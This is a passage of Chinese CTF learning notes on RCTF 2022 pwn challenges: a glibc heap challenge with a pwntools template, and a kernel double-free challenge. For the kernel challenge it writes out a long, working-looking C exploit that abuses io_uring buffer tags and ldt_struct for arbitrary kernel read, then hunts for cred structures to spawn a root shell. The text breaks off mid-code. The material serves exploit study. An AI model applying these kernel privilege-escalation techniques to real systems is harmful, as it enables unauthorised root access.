<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( init_2 )<br>&#123;<br>  --init_2;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1LL</span>);<br>&#125;<br><span class="hljs-keyword">return</span> init_2;<br></code></pre></div></td></tr></table></figure>

<p>完蛋, 又要wp学习法了吗…….</p>
<h3 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h3><blockquote>
<p>行吧, 预期解是house of apple. 难怪用2.35, 有用到IO chain. </p>
<p>但是nu1l的是tcache相关. 另一个<a target="_blank" rel="noopener" href="https://github.com/nobodyisnobody/write-ups/tree/main/RCTF.2022/pwn/bfc">非预期</a>.  </p>
</blockquote>
<p>1.读堆地址<br>2.修改tcache_struct，分配出tcache_struct<br>3.修改tcache_struct，随意分配，使tcache_struct被free并进⼊unsorted bin<br>4.泄漏libc地址，修改tcache_struct，分配⾄environ，此时栈地址应该被放⼊了堆中，泄漏栈地址<br>5.修改tcache_struct，分配到栈上，写ropd</p>
<p>但是实操第一步leak就卡住了. 诶算了, 借鉴个开头. 适用于几乎所有. </p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>ss = <span class="hljs-keyword">lambda</span> data :p.send(data)<br>sa = <span class="hljs-keyword">lambda</span> delim,data :p.sendafter(delim, data)<br>sl = <span class="hljs-keyword">lambda</span> data :p.sendline(data)<br>sla = <span class="hljs-keyword">lambda</span> delim,data :p.sendlineafter(delim, data)<br>ra = <span class="hljs-keyword">lambda</span> :p.recv()<br>rc = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span> :p.recv(numb)<br>ru = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span> :p.recvuntil(delims, drop)<br>uu32 = <span class="hljs-keyword">lambda</span> data :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64 = <span class="hljs-keyword">lambda</span> data :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>itt = <span class="hljs-keyword">lambda</span> :p.interactive()<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><span class="hljs-comment">#offset from zero</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):</span><br>    glibc_dir = <span class="hljs-string">&#x27;/glibs/glibc-2.35/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %self/\n&#x27;</span> % glibc_dir<br>    <span class="hljs-comment">#elf_base = int(os.popen(&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print\x241&#125;&#125;\x27&#x27;.format(p.pid)).readlines()[1], 16) if elf.pie else 0</span><br>    elf_base = <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript+<span class="hljs-string">&#x27;init-pwndbg\nni\n&#x27;</span>)<br>    time.sleep(<span class="hljs-number">1</span>)<br>binary = <span class="hljs-string">&#x27;./bfc&#x27;</span><br>elf = ELF(binary)<br>p = process(binary, aslr=<span class="hljs-literal">False</span>)<br>context(binary = elf ,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>, terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br>debug()<br></code></pre></div></td></tr></table></figure>

<h2 id="GAME"><a href="#GAME" class="headerlink" title="GAME"></a>GAME</h2><blockquote>
<p>本来是文件系统的题目, 结果有一个很简单的非预期<a target="_blank" rel="noopener" href="https://github.com/maple3142/My-CTF-Challenges/tree/master/ImaginaryCTF/Round%2026/not_a_kernel_pwn">类似题目</a>. 就是init里面unmount放在了shell退出之后, 于是利用shell来覆盖unmount文件达到pop root shell的目的. 然后看看他的<a target="_blank" rel="noopener" href="https://blog.rois.io/2022/rctf-2022-official-write-up/">预期解</a>. 是作者自己找的CVE, 嗯…………wp写的挺混沌, 文字 示例代码 exp三者对不上号. 看了好几天. </p>
</blockquote>
<ul>
<li>看到内核模块的参数设置, 还有<code>file-&gt;private_data</code>这个随意使用的指针. </li>
<li>看到我有一本Linux Device Driver, 感觉可以看看(学不完了这是)</li>
<li><a target="_blank" rel="noopener" href="https://www.kernel.org/doc/htmldocs/kernel-api/API-kmemdup.html"><code>kmemdup_nul</code></a>: duplicate region of memory with <u>null-terminated</u>. 和使用max做参数的<code>kstrndump</code>相比使用给定的长度, 性能更好. </li>
<li>gef抽风, 直接pull使用gef-remote失败, 使用示例image成功, 自己的又失败, 直接删掉重新git clone成功. 不知道啥问题, 反正解决了, 快照真好用. <ul>
<li><code>gef-remote --qemu-user --qemu-binary vmlinux localhost 1234</code> 新版gef remote</li>
</ul>
</li>
<li><a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man2/modify_ldt.2.html">modify_ldr</a>: <code>syscall(SYS_modify_ldt, int func, void *ptr, long bytecount);</code> func=1的时候是修改<code>ptr-&gt;entry_number</code>而不是读取(0). </li>
<li>无意间发现代佬的<a target="_blank" rel="noopener" href="https://arttnba3.cn/2021/11/29/PWN-0X02-LINUX-KERNEL-PWN-PART-II/">常用结构体集合</a>博客, 发现此题预期解前几步就在里面, 果然还是套路见少了. </li>
<li>io_uring 相关. <a target="_blank" rel="noopener" href="https://kernel.dk/io_uring.pdf">最全的英文文档</a>, 已下载. 看什么博客都不全, 连个<code>io_uring_queue_init</code>都找不到. 让我花点时间看看<ul>
<li>tag<ul>
<li>Each tag contains a maximum of PAGE_SIZE bytes. 至于什么是tag和table还得再看看. </li>
<li>我居然搜不到<code>io_uring_register_buffers_tags</code>的文档, <strong>而且为啥tag是啥都不说的</strong>, 难道是原本io的东西? 诶到时再看吧. 搜东西真累. man page都没有. </li>
<li>tag是二维数组. 第一维是8字节~0x1000(一个page)的子数组, 第二维是真正的tag数值, 通过<code>copy_from_user</code>从用户得到.</li>
<li>所以0x10的大小可以塞下一个子数组里两个tag值.  </li>
</ul>
</li>
<li>安装&amp;困难<ul>
<li>liburing将基本的系统调用包装了一下, 省去了手动建立io_uring instance的过程, 提供了一套更简单的接口. 即<code>queue_init</code>之类. </li>
<li>不懂IO操作会看的有一些困难. iovec就愣了一会儿. 找个时间看看原始的IO操作. </li>
<li><code>apt install liburing-dev</code> 然后再gcc的时候加上链接选项<code>-luring</code>即可. </li>
</ul>
</li>
<li>func<ul>
<li><code>io_uring_setup</code> 如名称一样只是setup一个io_uring结构体, 返回的fd还要手动mmap到进程空间中才能被内核与用户共享. submission和completion放在一个固定的offset上(通过macro). </li>
<li><code>io_uring_queue_init</code> with at least entries entries in the submission queue and then maps the file descriptor to memory shared between the application and the kernel.</li>
<li><code>io_uring_register_buffers</code> One of those is the ability to map a program’s I/O buffers into the kernel. 至于由tag的版本见上面. </li>
</ul>
</li>
</ul>
</li>
<li>看了几天居然有遗漏的地方, 难怪第一阶段就看不明白, reborn部分概括已修改. 好吧原来第一阶段的东西对后面有作用, 而且heap地址泄露完全和double free没有关系…..change()之后直接read就能读取heap地址….<del>这是在搞啥啊</del>. 终于看懂, </li>
<li><strong>结论: 发现一条路径能够通过修改指针指向的位置, 那就去想能否改变指针从而达到任意写? 多注意malloc和free函数, delMaind分析就写几个字怎么能反应得到呢.</strong> </li>
<li>发现之前找FUSE的时候看到的一篇文章里开头就是uring. <a target="_blank" rel="noopener" href="https://web.archive.org/web/20221119160242/https://www.graplsecurity.com/post/iou-ring-exploiting-the-linux-kernel">链接在此</a>. 原网站挂了用的webarchive. 挺长的. 甚至还有一篇使用ebpf进行kernel pwn的<a target="_blank" rel="noopener" href="https://web.archive.org/web/20221119160242/https://www.graplsecurity.com/post/kernel-pwning-with-ebpf-a-love-story">文章</a>, 不知道啥时候有心情看. 都在kernel in all中. </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Maind</span></span><br><span class="hljs-class">    <span class="hljs-title">unsigned</span> <span class="hljs-title">long</span> <span class="hljs-title">id</span>;</span><br>    <span class="hljs-keyword">char</span> username[<span class="hljs-number">0x20</span>];<br>    <span class="hljs-keyword">void</span> *cur;<br>    <span class="hljs-keyword">void</span> *prv;<br>    <span class="hljs-keyword">int</span> random;<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mycdev</span> &#123;</span><br>    <span class="hljs-keyword">int</span> len;<br>    <span class="hljs-keyword">unsigned</span>   <span class="hljs-keyword">char</span> buffer[<span class="hljs-number">50</span>];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span>   <span class="hljs-title">cdev</span> <span class="hljs-title">cdev</span>;</span><br>&#125;;<br></code></pre></div></td></tr></table></figure>

<p>module操作</p>
<ul>
<li>open: kzmalloc一个Maind结构体放到<code>file-&gt;private_data</code>里面</li>
<li>read: 最多9字节, 从<code>context-&gt;cur</code>复制</li>
<li>release: <code>private_data</code>直接置空</li>
<li>unlocked_ioctl: 0 1 114 22. 这特么是重生模拟器么.<ul>
<li>born: arg为username, 生成运气为ordinary, id=0. </li>
<li>reborn: cur移到prv, 生成unlucky和-114514的money. 很臭的金钱数. context-&gt;id++<br><strong>注意cur-&gt;magic移动到prv后并没有清空, 导致double free</strong> </li>
<li>change: arg为逗号分隔的等式, 左边为key_list, 右边可能为magic的字符串, 或money的钱数. <ul>
<li>当key=flag时, 直接对cur-&gt;magic进行free. </li>
</ul>
</li>
<li>delMaind: 就是删除. cur和prv都free, 在这里发生double free. </li>
</ul>
</li>
</ul>
<p>就是double free的利用. 其实挺简单的. 主要学到的东西是io_uring加上ldt_struct的利用</p>
<ul>
<li>io_uring中的tag操作可以malloc一个二维数组<code>size_t **tag</code>, 还有一个update_tag函数可以修改内容. 第一二级数组都是分配在内核heap上, 还可以通过二级数组来控制一级数组分配的大小. 如果能控制一级数组的指针, 那就相当于一个任意写. 方法是…详见代码. </li>
<li>此时ldt的modify操作中分配了一个0x10字节ldt_struct结构体, 前8字节在<code>read_ldt()</code>系统调用中在内核态使用memcpy来读取<strong>任意长度</strong>的<code>ldt_struct-&gt;entries</code>到用户区. 配合UAF漏洞可以和tag二级数组重合, 从而改变entries指针达到任意读. </li>
<li>最后找到cred结构体是通过第一步的heap指针往高处找(不知道为什么要跳到中间然后再前后找的方式). 发现设置好的进程名称后即可发现子进程的cred. 然后修改偏移查看哪个子进程提权了即可. 用到了SIGSTOP &amp;&amp; SIGCONT. 属于是process spray(误). </li>
</ul>
<h3 id="wp-1"><a href="#wp-1" class="headerlink" title="wp"></a>wp</h3><p>使用io_uring去修改ldt_struct结构体, </p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;asm/ldt.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;liburing.h&quot;</span></span><br><br><span class="hljs-keyword">int</span> fd = <span class="hljs-number">-1</span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PAGESIZE 0x1000</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ProcessNUM  0x30</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> UringNUM 0x20</span><br><span class="hljs-keyword">pid_t</span> processes[ProcessNUM];<br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __ID__ <span class="hljs-meta-string">&quot;wawwwwww&quot;</span></span><br><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring</span> <span class="hljs-title">ring</span>, <span class="hljs-title">ring1</span>, <span class="hljs-title">ring2</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ldt_struct</span> &#123;</span><br>    <span class="hljs-keyword">size_t</span>   entries;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> nr_entries;<br>    <span class="hljs-keyword">int</span>         slot;<br>&#125;;<br><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">errExit</span><span class="hljs-params">(<span class="hljs-keyword">char</span> * msg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Error at: %s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">init_uring</span><span class="hljs-params">()</span></span>&#123;<br>    io_uring_queue_init(<span class="hljs-number">2</span>,&amp;ring, <span class="hljs-number">0</span>);<br>    io_uring_queue_init(<span class="hljs-number">2</span>,&amp;ring1,<span class="hljs-number">0</span>);<br>    io_uring_queue_init(<span class="hljs-number">2</span>,&amp;ring2,<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">register_tag</span><span class="hljs-params">(struct io_uring *ring,<span class="hljs-keyword">size_t</span> *data,<span class="hljs-keyword">int</span> num)</span></span>&#123;<br>    <span class="hljs-keyword">char</span> tmp_buf[<span class="hljs-number">0x2000</span>];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span> <span class="hljs-title">vecs</span>[<span class="hljs-title">num</span>];</span><br>    <span class="hljs-keyword">size_t</span> tags[num];<br>    <span class="hljs-built_in">memcpy</span>(tags,data,num*<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">size_t</span>));<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;num;i++)&#123;<br>        vecs[i].iov_base = tmp_buf;<br>        vecs[i].iov_len = <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-comment">//io_alloc_page_table</span><br>    <span class="hljs-keyword">int</span> res = io_uring_register_buffers_tags(ring,vecs,tags,num);<span class="hljs-comment">//kcalloc(nr_tables, sizeof(*table), GFP_KERNEL_ACCOUNT);</span><br>    <span class="hljs-keyword">if</span> (res &lt; <span class="hljs-number">0</span>)&#123;<br>        errExit(<span class="hljs-built_in">sprintf</span>(<span class="hljs-string">&quot;io_uring_register_buffers_tags %d\n&quot;</span>,res));<br>    &#125;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">update_tag</span><span class="hljs-params">(struct io_uring *ring,<span class="hljs-keyword">size_t</span> Data,<span class="hljs-keyword">int</span> num)</span></span>&#123;<br>    <span class="hljs-keyword">char</span> tmp_buf[<span class="hljs-number">1024</span>];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span> <span class="hljs-title">vecs</span>[2];</span><br>    vecs[<span class="hljs-number">0</span>].iov_base = tmp_buf;<br>    vecs[<span class="hljs-number">0</span>].iov_len = <span class="hljs-number">1</span>;<br>    vecs[<span class="hljs-number">1</span>].iov_base = tmp_buf;<br>    vecs[<span class="hljs-number">1</span>].iov_len = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">int</span> ret = io_uring_register_buffers_update_tag(ring, <span class="hljs-number">0</span>,vecs,Data,num);<br>    <span class="hljs-keyword">if</span> (ret &lt;<span class="hljs-number">0</span>)&#123;<br>        errExit(<span class="hljs-built_in">sprintf</span>(<span class="hljs-string">&quot;io_uring_register_buffers_update_tag %d\n&quot;</span>,ret));<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">spawn_processes</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; ProcessNUM; i++)<br>    &#123;<br>        <span class="hljs-keyword">pid_t</span> child = fork();<br>        <span class="hljs-keyword">if</span> (child == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">if</span> (prctl(PR_SET_NAME, __ID__, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) != <span class="hljs-number">0</span>) &#123;<br>                perror(<span class="hljs-string">&quot;Could not set name&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">uid_t</span> old = getuid();<br>            kill(getpid(), SIGSTOP);<br>            <span class="hljs-keyword">uid_t</span> uid = getuid();<br>            <span class="hljs-keyword">if</span> (uid == <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Enjoy root!&quot;</span>);<br>                system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>            &#125;<br>            <span class="hljs-built_in">exit</span>(uid);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (child &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> child;<br>        &#125;<br>        processes[i] = child;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">size_t</span> <span class="hljs-title">find_cred</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> heap)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ldt_struct</span> <span class="hljs-title">ldt</span>;</span><br>    <span class="hljs-keyword">char</span> buf[PAGESIZE];<br>    <span class="hljs-keyword">size_t</span> *result_addr;<br>    <span class="hljs-keyword">size_t</span> cred_addr = <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">int</span> pipe_fd[<span class="hljs-number">2</span>];<br>    <span class="hljs-keyword">int</span> res = pipe(pipe_fd);<br>    <span class="hljs-keyword">if</span>(res)<br>        errExit(<span class="hljs-string">&quot;pipe&quot;</span>);<br><br>    heap = (heap/<span class="hljs-number">0x1000</span>)*<span class="hljs-number">0x1000</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; PAGESIZE*PAGESIZE ; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(i &amp;&amp; (i % <span class="hljs-number">0x100</span>) == <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;looked up range from %p ~ %p\n&quot;</span>,heap - i * PAGESIZE,heap + i * PAGESIZE);<br>        &#125;<br>        <span class="hljs-comment">//Forward search</span><br>        <span class="hljs-built_in">memset</span>(buf,<span class="hljs-number">0</span>,PAGESIZE);<br>        ldt.entries = heap - i * PAGESIZE;<br>        ldt.nr_entries = PAGESIZE/<span class="hljs-number">8</span>;<br>        update_tag(&amp;ring,&amp;ldt,<span class="hljs-number">2</span>);<span class="hljs-comment">//Setting the search Address</span><br>        <span class="hljs-keyword">if</span>(!fork())&#123;<br>            <span class="hljs-keyword">int</span> res = syscall(SYS_modify_ldt, <span class="hljs-number">0</span>, buf, PAGESIZE);<br>            <span class="hljs-keyword">if</span>(res == PAGESIZE)&#123;<br>                result_addr = (<span class="hljs-keyword">size_t</span>*) memmem(buf, <span class="hljs-number">0x1000</span>, __ID__, <span class="hljs-number">8</span>);<br>                <span class="hljs-keyword">if</span> (result_addr)&#123;<br>                    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found cred: \033[0m0x%lx\n&quot;</span>, result_addr[<span class="hljs-number">-2</span>]);<br>                    cred_addr = result_addr[<span class="hljs-number">-2</span>];<br>                &#125;<br>                write(pipe_fd[<span class="hljs-number">1</span>], &amp;cred_addr, <span class="hljs-number">8</span>);<br>            &#125;<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        &#125;<br>        wait(<span class="hljs-literal">NULL</span>);<br>        read(pipe_fd[<span class="hljs-number">0</span>], &amp;cred_addr, <span class="hljs-number">8</span>);<br>        <span class="hljs-keyword">if</span> (cred_addr != <span class="hljs-number">-1</span>)<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-comment">//Search backwards</span><br>        <span class="hljs-built_in">memset</span>(buf,<span class="hljs-number">0</span>,PAGESIZE);<br>        ldt.entries = heap + i * PAGESIZE;<br>        ldt.nr_entries = PAGESIZE/<span class="hljs-number">8</span>;<br>        update_tag(&amp;ring,&amp;ldt,<span class="hljs-number">2</span>);<span class="hljs-comment">//Setting the search Address</span><br>        <span class="hljs-keyword">if</span>(!fork())&#123;<br>            <span class="hljs-keyword">int</span> res = syscall(SYS_modify_ldt, <span class="hljs-number">0</span>, buf, PAGESIZE);<br>            <span class="hljs-keyword">if</span>(res == PAGESIZE)&#123;<br>                result_addr = (<span class="hljs-keyword">size_t</span>*) memmem(buf, <span class="hljs-number">0x1000</span>, __ID__, <span class="hljs-number">8</span>);<br>                <span class="hljs-keyword">if</span> (result_addr)&#123;<br>                    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found cred: \033[0m0x%lx\n&quot;</span>, result_addr[<span class="hljs-number">-2</span>]);<br>                    cred_addr = result_addr[<span class="hljs-number">-2</span>];<br>                &#125;<br>                write(pipe_fd[<span class="hljs-number">1</span>], &amp;cred_addr, <span class="hljs-number">8</span>);<br>            &#125;<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        &#125;<br>        wait(<span 